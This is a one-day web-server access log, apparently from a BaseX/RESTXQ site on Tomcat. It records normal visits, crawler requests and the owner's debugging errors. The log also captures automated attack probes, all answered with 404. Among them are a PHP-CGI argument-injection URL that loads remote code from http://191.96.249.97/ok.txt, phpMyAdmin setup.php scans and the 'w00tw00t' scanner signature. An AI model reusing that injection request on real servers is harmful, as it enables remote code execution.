+01:14:22.012	129.59.122.19:38793	admin	REQUEST	[GET] http://tcadrt.org/
+01:14:22.118	129.59.122.19:38793	admin	200		105.42 ms
+01:37:41.383	186.151.173.181:37650	admin	REQUEST	[GET] http://localhost:8080/
+01:37:42.107	186.151.173.181:37650	admin	200		723.79 ms
+01:37:42.539	186.151.173.181:37651	admin	REQUEST	[GET] http://localhost:8080/
+01:37:42.571	186.151.173.181:37651	admin	200		32.54 ms
+01:37:43.803	186.151.173.181:37653	admin	REQUEST	[GET] http://localhost:8080/
+01:37:43.895	186.151.173.181:37653	admin	200		92.23 ms
+02:55:06.399	139.59.166.1:39718	admin	REQUEST	[GET] http://www.tcadrt.org/
+02:55:07.936	139.59.166.1:39718	admin	200		1537.45 ms
+03:40:07.981	107.194.254.78:49372	admin	REQUEST	[GET] http://tcadrt.org/gom/
+03:40:08.011	107.194.254.78:49372	admin	404	No function found that matches the request.	30.36 ms
+03:40:13.565	107.194.254.78:49372	admin	REQUEST	[GET] http://tcadrt.org/gom/
+03:40:13.646	107.194.254.78:49372	admin	404	No function found that matches the request.	82.05 ms
+03:40:14.187	107.194.254.78:49372	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+03:40:14.187	107.194.254.78:49372	admin	404	No function found that matches the request.	0.61 ms
+03:40:17.504	107.194.254.78:49372	admin	REQUEST	[GET] http://tcadrt.org/gom/
+03:40:17.561	107.194.254.78:49372	admin	404	No function found that matches the request.	57.22 ms
+03:40:33.645	107.194.254.78:49372	admin	REQUEST	[GET] http://tcadrt.org/tool
+03:40:34.735	107.194.254.78:49372	admin	200		1090.03 ms
+03:40:47.801	107.194.254.78:49406	admin	REQUEST	[GET] http://tcadrt.org/gom/
+03:40:47.831	107.194.254.78:49406	admin	404	No function found that matches the request.	29.84 ms
+03:41:58.668	107.194.254.78:49522	admin	REQUEST	[GET] http://tcadrt.org/
+03:42:00.605	107.194.254.78:49522	admin	200		1937.17 ms
+03:42:02.717	107.194.254.78:49522	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+03:42:02.747	107.194.254.78:49522	admin	404	No function found that matches the request.	29.92 ms
+03:42:07.688	107.194.254.78:49555	admin	REQUEST	[GET] http://tcadrt.org/tool
+03:42:07.780	107.194.254.78:49555	admin	200		92.82 ms
+03:42:13.386	107.194.254.78:49555	admin	REQUEST	[GET] http://tcadrt.org/
+03:42:13.466	107.194.254.78:49555	admin	200		80.56 ms
+03:42:40.029	107.194.254.78:49587	admin	REQUEST	[GET] http://tcadrt.org/gom/
+03:42:40.050	107.194.254.78:49587	admin	404	No function found that matches the request.	21.74 ms
+03:42:40.155	107.194.254.78:49587	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+03:42:40.155	107.194.254.78:49587	admin	404	No function found that matches the request.	0.52 ms
+03:42:42.323	107.194.254.78:49587	admin	REQUEST	[GET] http://tcadrt.org/gom/
+03:42:42.324	107.194.254.78:49587	admin	404	No function found that matches the request.	0.65 ms
+03:42:42.412	107.194.254.78:49587	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+03:42:42.412	107.194.254.78:49587	admin	404	No function found that matches the request.	0.48 ms
+03:42:44.725	107.194.254.78:49587	admin	REQUEST	[GET] http://tcadrt.org/gom/
+03:42:44.726	107.194.254.78:49587	admin	404	No function found that matches the request.	0.63 ms
+03:42:44.812	107.194.254.78:49587	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+03:42:44.812	107.194.254.78:49587	admin	404	No function found that matches the request.	0.61 ms
+03:44:07.131	107.194.254.78:49645	admin	REQUEST	[GET] http://tcadrt.org/
+03:44:07.204	107.194.254.78:49645	admin	200		73.85 ms
+03:48:06.221	107.194.254.78:49712	admin	REQUEST	[GET] http://tcadrt.org/tool
+03:48:06.335	107.194.254.78:49712	admin	200		114.57 ms
+03:48:44.172	107.194.254.78:49722	admin	REQUEST	[GET] http://tcadrt.org/
+03:48:44.571	107.194.254.78:49722	admin	200		398.6 ms
+03:57:38.998	191.96.249.97:59325	admin	REQUEST	[GET] http://207.58.154.226/cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+03:57:39.027	191.96.249.97:59325	admin	404	No function found that matches the request.	29.03 ms
+03:57:51.996	107.194.254.78:49877	admin	REQUEST	[GET] http://tcadrt.org/tool
+03:57:53.176	107.194.254.78:49877	admin	200		1179.92 ms
+04:22:44.736	66.249.65.188:41505	admin	REQUEST	[GET] http://areiaoesporte.com.br/robots.txt
+04:22:44.765	66.249.65.188:41505	admin	404	No function found that matches the request.	29.3 ms
+04:22:44.802	66.249.65.188:41505	admin	REQUEST	[GET] http://areiaoesporte.com.br/
+04:22:45.616	66.249.65.188:41505	admin	200		815.01 ms
+04:40:52.592	80.232.204.210:35734	admin	REQUEST	[GET] http://207.58.154.226/w00tw00t.at.blackhats.romanian.anti-sec:)
+04:40:52.627	80.232.204.210:35734	admin	404	No function found that matches the request.	35.44 ms
+04:40:52.855	80.232.204.210:35880	admin	REQUEST	[GET] http://207.58.154.226/phpMyAdmin/scripts/setup.php
+04:40:52.856	80.232.204.210:35880	admin	404	No function found that matches the request.	0.86 ms
+04:40:53.084	80.232.204.210:35976	admin	REQUEST	[GET] http://207.58.154.226/phpmyadmin/scripts/setup.php
+04:40:53.084	80.232.204.210:35976	admin	404	No function found that matches the request.	0.81 ms
+04:40:53.318	80.232.204.210:36098	admin	REQUEST	[GET] http://207.58.154.226/pma/scripts/setup.php
+04:40:53.318	80.232.204.210:36098	admin	404	No function found that matches the request.	0.63 ms
+04:40:53.544	80.232.204.210:36234	admin	REQUEST	[GET] http://207.58.154.226/myadmin/scripts/setup.php
+04:40:53.545	80.232.204.210:36234	admin	404	No function found that matches the request.	0.65 ms
+04:40:53.773	80.232.204.210:36344	admin	REQUEST	[GET] http://207.58.154.226/MyAdmin/scripts/setup.php
+04:40:53.774	80.232.204.210:36344	admin	404	No function found that matches the request.	0.61 ms
+04:44:15.043	66.249.65.38:34502	admin	REQUEST	[GET] http://tcadrt.org/robots.txt
+04:44:15.084	66.249.65.38:34502	admin	404	No function found that matches the request.	40.81 ms
+04:44:15.123	66.249.65.38:34502	admin	REQUEST	[GET] http://tcadrt.org/
+04:44:16.632	66.249.65.38:34502	admin	200		1508.69 ms
+04:47:10.056	66.249.65.38:35219	admin	REQUEST	[GET] http://tcadrt.org/tool
+04:47:11.796	66.249.65.38:35219	admin	200		1740.21 ms
+06:05:03.625	118.100.143.193:4623	admin	REQUEST	[GET] http://localhost:8080/
+06:05:07.233	118.100.143.193:4623	admin	200		3608.06 ms
+06:58:38.819	191.96.249.97:51759	admin	REQUEST	[GET] http://207.58.154.226/setup.cgi
+06:58:38.838	191.96.249.97:51759	admin	404	No function found that matches the request.	19.19 ms
+08:13:37.183	193.201.225.85:59949	admin	REQUEST	[GET] http://tcadrt.org/wp-login.php
+08:13:37.208	193.201.225.85:59949	admin	404	No function found that matches the request.	25.12 ms
+08:13:37.498	193.201.225.85:59968	admin	REQUEST	[GET] http://tcadrt.org/administrator/index.php
+08:13:37.499	193.201.225.85:59968	admin	404	No function found that matches the request.	0.46 ms
+08:41:42.601	110.137.125.248:57491	admin	REQUEST	[GET] http://localhost:8080/
+08:41:44.348	110.137.125.248:57491	admin	200		1746.58 ms
+09:00:37.035	196.52.43.64:1661	admin	REQUEST	[GET] http://localhost:8080/
+09:00:37.222	196.52.43.64:1661	admin	200		187.26 ms
+11:28:49.435	75.129.166.54:62516	admin	REQUEST	[GET] http://tcadrt.org/
+11:28:51.103	75.129.166.54:62516	admin	200		1667.88 ms
+11:28:51.959	75.129.166.54:62518	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+11:28:51.959	75.129.166.54:62518	admin	404	No function found that matches the request.	0.45 ms
+11:29:31.002	75.129.166.54:62572	admin	REQUEST	[GET] http://tcadrt.org/tool
+11:29:31.087	75.129.166.54:62572	admin	200		84.93 ms
+11:30:48.273	75.129.166.54:62657	admin	REQUEST	[GET] http://tcadrt.org/work/000002
+11:30:49.526	75.129.166.54:62657	admin	400	Stopped at /opt/tomcat/webapps/ROOT/restxq.xqm, 92/40: [FODC0002] Resource '/opt/tomcat/webapps/ROOT/work-class-lookup' does not exist.	1252.96 ms
+11:59:55.954	75.129.166.54:63819	admin	REQUEST	[GET] http://tcadrt.org/detail?000002
+11:59:59.485	75.129.166.54:63819	admin	200		3531.24 ms
+12:01:46.174	75.129.166.54:63851	admin	REQUEST	[GET] http://tcadrt.org/dump/site
+12:01:46.447	75.129.166.54:63851	admin	400	Stopped at https://raw.githubusercontent.com/baskaufs/guid-o-matic/master/serialize.xqm, 34/32: [FODC0002] Resource "https://raw.githubusercontent.com/baskaufs/guid-o-matic/master/site" not found. Information: 404: Not Found Stack Trace: - /opt/tomcat/webapps/ROOT/restxq.xqm, 74/24	273.67 ms
+12:03:05.499	75.129.166.54:63869	admin	REQUEST	[GET] http://tcadrt.org/dump/site.ttl
+12:03:06.563	75.129.166.54:63869	admin	400	Stopped at https://raw.githubusercontent.com/baskaufs/guid-o-matic/master/serialize.xqm, 34/32: [FODC0002] Resource "https://raw.githubusercontent.com/baskaufs/guid-o-matic/master/site.ttl" not found. Information: 404: Not Found Stack Trace: - /opt/tomcat/webapps/ROOT/restxq.xqm, 74/24	1064.76 ms
+12:09:24.682	75.129.166.54:64128	admin	REQUEST	[GET] http://tcadrt.org/work/000002
+12:09:25.093	75.129.166.54:64128	admin	400	Stopped at /opt/tomcat/webapps/ROOT/restxq.xqm, 92/40: [FODC0002] Resource '/opt/tomcat/webapps/gom/work-class-lookup' does not exist.	411.18 ms
+12:10:04.217	75.129.166.54:64144	admin	REQUEST	[GET] http://tcadrt.org/work/000002
+12:10:05.380	75.129.166.54:64144	admin	400	Stopped at /opt/tomcat/webapps/ROOT/restxq.xqm, 92/40: [FODC0002] Resource '/opt/tomcat/webapps/work-class-lookup' does not exist.	1163.03 ms
+12:11:12.779	75.129.166.54:64190	admin	REQUEST	[GET] http://tcadrt.org/work/000002
+12:11:13.878	75.129.166.54:64190	admin	400	Stopped at /opt/tomcat/webapps/ROOT/restxq.xqm, 92/40: [FODC0002] Resource "http://vuswwg.jelastic.servint.net/gom/work-class-lookup" not found. Information: No function found that matches the request.	1100.15 ms
+12:11:49.849	75.129.166.54:64237	admin	REQUEST	[GET] http://tcadrt.org/work/000002
+12:11:50.279	75.129.166.54:64237	admin	400	Stopped at /opt/tomcat/webapps/ROOT/restxq.xqm, 92/40: [FODC0002] Resource '/opt/tomcat/webapps/ROOT/work-class-lookup' does not exist.	430.37 ms
+12:14:46.605	191.96.249.97:57957	admin	REQUEST	[GET] http://localhost:8080/phpmyadmin/scripts/setup.php
+12:14:46.633	191.96.249.97:57957	admin	404	No function found that matches the request.	28.3 ms
+12:18:33.770	75.129.166.54:64367	admin	REQUEST	[GET] http://tcadrt.org/
+12:18:33.895	75.129.166.54:64367	admin	200		125.0 ms
+14:01:16.600	76.22.230.232:50147	admin	REQUEST	[GET] http://tcadrt.org/gom/
+14:01:16.629	76.22.230.232:50147	admin	404	No function found that matches the request.	28.73 ms
+14:01:24.295	76.22.230.232:50147	admin	REQUEST	[GET] http://tcadrt.org/
+14:01:24.856	76.22.230.232:50147	admin	200		560.68 ms
+14:02:02.736	76.22.230.232:50167	admin	REQUEST	[GET] http://tcadrt.org/tool
+14:02:02.826	76.22.230.232:50167	admin	200		90.24 ms
+14:05:05.644	76.22.230.232:50184	admin	REQUEST	[GET] http://tcadrt.org/tool
+14:05:05.711	76.22.230.232:50184	admin	200		67.55 ms
+14:48:31.794	66.249.88.63:50547	admin	REQUEST	[GET] http://tcadrt.org/
+14:48:32.166	66.249.88.63:50547	admin	200		372.82 ms
+14:48:32.227	66.249.88.33:47572	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+14:48:32.227	66.249.88.33:47572	admin	404	No function found that matches the request.	0.39 ms
+14:56:18.183	191.96.249.97:39949	admin	REQUEST	[GET] http://207.58.154.226/setup.cgi
+14:56:18.224	191.96.249.97:39949	admin	404	No function found that matches the request.	41.0 ms
+15:08:58.389	188.6.74.62:57063	admin	REQUEST	[GET] http://207.58.154.226/phpTest/zologize/axa.php
+15:08:58.461	188.6.74.62:57063	admin	404	No function found that matches the request.	71.98 ms
+15:08:58.860	188.6.74.62:57178	admin	REQUEST	[GET] http://207.58.154.226/phpMyAdmin/scripts/setup.php
+15:08:58.860	188.6.74.62:57178	admin	404	No function found that matches the request.	0.45 ms
+15:08:59.284	188.6.74.62:57298	admin	REQUEST	[GET] http://207.58.154.226/pma/scripts/setup.php
+15:08:59.285	188.6.74.62:57298	admin	404	No function found that matches the request.	0.44 ms
+15:08:59.698	188.6.74.62:57403	admin	REQUEST	[GET] http://207.58.154.226/myadmin/scripts/setup.php
+15:08:59.698	188.6.74.62:57403	admin	404	No function found that matches the request.	0.44 ms
+16:15:36.046	221.231.97.123:56697	admin	REQUEST	[GET] http://207.58.154.226/phpMyAdmin/scripts/setup.php
+16:15:36.074	221.231.97.123:56697	admin	404	No function found that matches the request.	28.04 ms
+16:16:54.311	221.231.97.123:59909	admin	REQUEST	[GET] http://207.58.154.226/pma/scripts/setup.php
+16:16:54.340	221.231.97.123:59909	admin	404	No function found that matches the request.	28.57 ms
+16:18:12.560	221.231.97.123:63838	admin	REQUEST	[GET] http://207.58.154.226/myadmin/scripts/setup.php
+16:18:12.589	221.231.97.123:63838	admin	404	No function found that matches the request.	29.18 ms
+16:52:41.215	107.194.254.78:52990	admin	REQUEST	[GET] http://tcadrt.org/
+16:52:41.753	107.194.254.78:52990	admin	200		538.73 ms
+16:52:42.191	107.194.254.78:52994	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+16:52:42.191	107.194.254.78:52994	admin	404	No function found that matches the request.	0.43 ms
+16:52:55.781	107.194.254.78:52994	admin	REQUEST	[GET] http://tcadrt.org/tool
+16:52:55.856	107.194.254.78:52994	admin	200		75.54 ms
+17:01:18.828	58.96.56.11:55427	admin	REQUEST	[GET] http://tcadrt.org/wp-login.php
+17:01:18.874	58.96.56.11:55427	admin	404	No function found that matches the request.	45.52 ms
+17:01:19.582	58.96.56.11:55518	admin	REQUEST	[GET] http://tcadrt.org/administrator/index.php
+17:01:19.582	58.96.56.11:55518	admin	404	No function found that matches the request.	0.42 ms
+17:01:29.318	58.96.56.11:55570	admin	REQUEST	[GET] http://tcadrt.org/admin.php
+17:01:29.346	58.96.56.11:55570	admin	404	No function found that matches the request.	28.16 ms
+18:39:51.968	SERVER	admin	OK	Server was started (port: 1984).
+18:48:14.347	191.96.249.97:41698	admin	REQUEST	[GET] http://207.58.154.226/setup.cgi
+18:48:21.548	191.96.249.97:41698	admin	404	No function found that matches the request.	7207.9 ms
+18:51:53.994	81.83.12.46:48004	admin	REQUEST	[GET] http://localhost:8080/
+18:51:55.276	81.83.12.46:48004	admin	200		1283.08 ms
+19:01:21.903	66.249.65.191:41806	admin	REQUEST	[GET] http://areiaoesporte.com.br/robots.txt
+19:01:21.988	66.249.65.191:41806	admin	404	No function found that matches the request.	84.81 ms
+19:01:22.074	66.249.65.188:64861	admin	REQUEST	[GET] http://areiaoesporte.com.br/
+19:01:22.835	66.249.65.188:64861	admin	200		760.98 ms
+19:04:25.780	66.249.65.38:50312	admin	REQUEST	[GET] http://tcadrt.org/robots.txt
+19:04:25.901	66.249.65.38:50312	admin	404	No function found that matches the request.	121.52 ms
+19:04:25.974	66.249.65.40:48605	admin	REQUEST	[GET] http://tcadrt.org/
+19:04:26.108	66.249.65.40:48605	admin	200		134.61 ms
+19:07:34.954	66.249.65.38:49019	admin	REQUEST	[GET] http://tcadrt.org/tool
+19:07:36.722	66.249.65.38:49019	admin	200		1768.1 ms
+19:27:07.416	104.238.248.15:2326	admin	REQUEST	[GET] http://www.tcadrt.org/
+19:27:08.051	104.238.248.15:2326	admin	200		635.35 ms
+19:29:41.509	74.94.172.242:60579	admin	REQUEST	[GET] http://tcadrt.org/qxa6YhGfGeGCzWHcKbf.js
+19:29:41.551	74.94.172.242:60579	admin	404	No function found that matches the request.	42.58 ms
+21:07:37.917	194.87.239.7:43536	admin	REQUEST	[GET] http://207.58.154.226:8080/
+21:07:38.572	194.87.239.7:43536	admin	200		656.11 ms
+21:37:48.988	198.186.192.44:34335	admin	REQUEST	[GET] http://www.tcadrt.org/
+21:37:49.851	198.186.192.44:34335	admin	200		863.59 ms
+22:10:25.884	139.162.114.70:44212	admin	REQUEST	[GET] http://207.58.154.226/
+22:10:26.797	139.162.114.70:44212	admin	200		913.26 ms
+22:20:25.315	201.165.184.84:45122	admin	REQUEST	[GET] http://localhost:8080/
+22:20:25.762	201.165.184.84:45122	admin	200		446.62 ms
+22:20:25.992	201.165.184.84:45123	admin	REQUEST	[GET] http://localhost:8080/
+22:20:26.090	201.165.184.84:45123	admin	200		99.03 ms
+22:20:26.307	201.165.184.84:45124	admin	REQUEST	[GET] http://localhost:8080/
+22:20:26.366	201.165.184.84:45124	admin	200		59.83 ms
+22:20:26.608	201.165.184.84:45125	admin	REQUEST	[GET] http://localhost:8080/
+22:20:26.685	201.165.184.84:45125	admin	200		77.67 ms
+22:20:26.897	201.165.184.84:45126	admin	REQUEST	[GET] http://localhost:8080/
+22:20:26.963	201.165.184.84:45126	admin	200		66.63 ms
+22:20:51.943	201.165.184.84:45145	admin	REQUEST	[GET] http://localhost:8080/
+22:20:52.038	201.165.184.84:45145	admin	200		94.94 ms
+22:35:52.468	66.240.236.119:46413	admin	REQUEST	[GET] http://207.58.154.226:8080/
+22:35:52.685	66.240.236.119:46413	admin	200		217.25 ms
+23:01:30.386	198.20.69.98:42611	admin	REQUEST	[GET] http://207.58.154.226:8080/
+23:01:31.585	198.20.69.98:42611	admin	200		1199.93 ms
+23:11:16.829	114.215.223.144:2602	admin	REQUEST	[GET] http://207.58.154.226:8080/manager/html
+23:11:16.869	114.215.223.144:2602	admin	404	No function found that matches the request.	40.85 ms
+23:24:05.722	123.57.50.142:50041	admin	REQUEST	[GET] http://207.58.154.226/phpMyAdmin/scripts/setup.php
+23:24:05.811	123.57.50.142:50041	admin	404	No function found that matches the request.	89.59 ms
+23:25:24.113	123.57.50.142:53987	admin	REQUEST	[GET] http://207.58.154.226/pma/scripts/setup.php
+23:25:24.151	123.57.50.142:53987	admin	404	No function found that matches the request.	38.47 ms
+23:26:42.505	123.57.50.142:57121	admin	REQUEST	[GET] http://207.58.154.226/myadmin/scripts/setup.php
+23:26:42.544	123.57.50.142:57121	admin	404	No function found that matches the request.	39.05 ms
